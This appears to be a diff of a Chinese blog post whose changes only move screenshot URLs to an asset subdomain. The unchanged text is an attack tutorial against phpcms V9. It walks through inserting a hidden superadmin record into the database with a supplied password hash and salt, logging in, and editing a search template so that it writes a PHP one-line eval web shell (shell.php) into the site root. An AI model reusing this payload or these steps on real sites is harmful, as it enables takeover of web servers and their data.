@@ -130,27 +130,27 @@
 <p>分子拿到密码也没用因为破解不了他的密码，其实我想说你丫的把黑阔当傻子？你能想到</p>
 <p>的别人想不到，废话就不说了，看着就是了~~</p>
 <p>本地搭建的phpcsmV9.现用漏洞或者工具读取数据库信息：</p>
-<p><a href="http://www.creturn.com/asset/uploads/2012/07/v9shell_1.jpg" target="_blank"><img src="http://www.creturn.com/asset/uploads/2012/07/v9shell_1.jpg" alt="" title="v9shell_1"></a></p>
+<p><a href="http://asset.creturn.com/asset/uploads/2012/07/v9shell_1.jpg" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/07/v9shell_1.jpg" alt="" title="v9shell_1"></a></p>
 <p><a id="more"></a>
 数据库phpcmsv9用户名：root  密码为空</p>
 <p>我们用一款数据库管理工具连接数据库我用的是navicat</p>
 <p>打开工具点击连接-mysql配置数据库信息如图：</p>
-<p><a href="http://www.creturn.com/asset/uploads/2012/07/v9shell_2.jpg" target="_blank"><img src="http://www.creturn.com/asset/uploads/2012/07/v9shell_2.jpg" alt="" title="v9shell_2"></a></p>
+<p><a href="http://asset.creturn.com/asset/uploads/2012/07/v9shell_2.jpg" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/07/v9shell_2.jpg" alt="" title="v9shell_2"></a></p>
 <p>打开phpcmsV9数据库并且找到admin表，向表中添加一条数据，因为我们没法破解他的密码那么咱们就自己</p>
 <p>添加一个用户以便能够登录后台操作：</p>
 <blockquote>
 <p>Username:admin password: 748b4dfa3a7159c1eb1baa46f222f9b8 roleid:1 encrypt:C6mB9p</p>
 </blockquote>
 <p>注意这几项必须添负责登录不了的。应为这条记录的意思是添加用户名为admin,密码为：creturn.com的超级管理员</p>
-<p><a href="http://www.creturn.com/asset/uploads/2012/07/v9shell_3.jpg" target="_blank"><img src="http://www.creturn.com/asset/uploads/2012/07/v9shell_3.jpg" alt="" title="v9shell_3"></a></p>
+<p><a href="http://asset.creturn.com/asset/uploads/2012/07/v9shell_3.jpg" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/07/v9shell_3.jpg" alt="" title="v9shell_3"></a></p>
 <blockquote>
 <p>后台登录地址：localhost/index.php?m=admin</p>
 <p>用户名：admin 密码：creturn.com</p>
 </blockquote>
 <p>登录后台后我们找到界面-》模版风格-》选择默认模版点击详情列表</p>
-<p><a href="http://www.creturn.com/asset/uploads/2012/07/v9shell_41.jpg" target="_blank"><img src="http://www.creturn.com/asset/uploads/2012/07/v9shell_41-1024x163.jpg" alt="" title="v9shell_4"></a></p>
+<p><a href="http://asset.creturn.com/asset/uploads/2012/07/v9shell_41.jpg" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/07/v9shell_41-1024x163.jpg" alt="" title="v9shell_4"></a></p>
 <p>然后点击里面的search目录下面的index.html右侧的编辑</p>
-<p><a href="http://www.creturn.com/asset/uploads/2012/07/v9shell_5.jpg" target="_blank"><img src="http://www.creturn.com/asset/uploads/2012/07/v9shell_5.jpg" alt="" title="v9shell_5"></a></p>
+<p><a href="http://asset.creturn.com/asset/uploads/2012/07/v9shell_5.jpg" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/07/v9shell_5.jpg" alt="" title="v9shell_5"></a></p>
 <p>修改其模版为：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre>1
 </pre></td><td class="code"><pre><span class="preprocessor">&lt;?php</span> <span class="variable">$shell</span> = <span class="string">'&lt;?php @eval($_POST[cmd]);'</span>;file_put_contents(<span class="string">'shell.php'</span>,<span class="variable">$shell</span>);<span class="preprocessor">?&gt;</span>
@@ -159,7 +159,7 @@
 <p>提交保存</p>
 <p>然后访问：localhost/index.php?m=search</p>
 <p>会在根目录生成一个shell.php的一句话，我们连接看看</p>
-<p><a href="http://www.creturn.com/asset/uploads/2012/07/v9shell_6.jpg" target="_blank"><img src="http://www.creturn.com/asset/uploads/2012/07/v9shell_6.jpg" alt="" title="v9shell_6"></a></p>
+<p><a href="http://asset.creturn.com/asset/uploads/2012/07/v9shell_6.jpg" target="_blank"><img src="http://asset.creturn.com/asset/uploads/2012/07/v9shell_6.jpg" alt="" title="v9shell_6"></a></p>
 <p>可以看到已经拿到shell，记得把修改的模版改回去。</p>
 <p>至此，如果还有管理员认为这个漏洞是鸡肋，那我就无话可说了！</p>
 <p>最近发现有人那我写的Exp改作者名和版权信息后发到自己的站上，等我有时间了会光顾你们的！</p>
